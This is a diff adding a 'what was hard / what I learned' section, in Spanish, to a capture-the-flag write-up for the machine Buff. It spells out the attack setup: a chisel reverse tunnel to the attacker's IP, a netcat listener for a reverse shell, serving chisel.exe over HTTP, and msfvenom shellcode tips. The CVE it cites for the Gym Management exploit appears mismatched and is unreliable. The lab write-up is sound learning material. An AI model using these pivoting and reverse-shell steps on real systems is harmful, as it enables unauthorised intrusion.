@@ -180,7 +180,26 @@ type C:\Users\Administrator\Desktop\root.txt
 - **Principio de mínimo privilegio**: que un servicio local comprometido no conceda
   directamente permisos de administrador reduce el impacto de la escalada.
 
-## Qué he aprendido
+## Lo que me costó / Lo que aprendí
+
+**Lo que me costó.** La primera mitad fue rápida: la subida de ficheros sin autenticación de
+Gym Management Software 1.0 (CVE-2020-25223) da una shell como `shaun` en un momento. Lo que
+costó de verdad fue **la escalada**, y por dos cosas.
+
+La primera: el servicio vulnerable (CloudMe) **solo escuchaba en `127.0.0.1`**, así que desde
+fuera no había nada a atacar. La salida era el *pivoting* con chisel, y ahí lo que más se lleva
+es montar bien las tres piezas —el `chisel server --reverse` en nuestra máquina, un
+`python3 -m http.server 80` para que la víctima pueda descargar `chisel.exe`, y el
+`nc -lvnp 4444` esperando la shell— y arrancar la víctima **desde dentro** con
+`chisel.exe client <ip>:8000 R:8888:127.0.0.1:8888`, que es lo que hace que el puerto local
+de Buff aparezca en nuestro propio `127.0.0.1:8888`.
+
+La segunda: el *buffer overflow* casero. La shellcode que genera `msfvenom` no vale tal cual:
+hay que excluir los *bad chars* (`\x00`, `\x0a`, `\x0d`) o se rompe al copiarla al buffer, y
+hay que generarla en el formato que el script espera (`-f python`, con la variable `buf`) y
+apuntar el exploit al extremo del túnel (`127.0.0.1:8888`), no a la IP de la máquina.
+
+**Lo que aprendí.** De esto me llevo tres cosas:
 
 - Cuando un servicio escucha solo en `127.0.0.1`, no está «a salvo»: con *pivoting*
   (aquí con chisel) se puede alcanzar desde fuera y explotar igualmente.
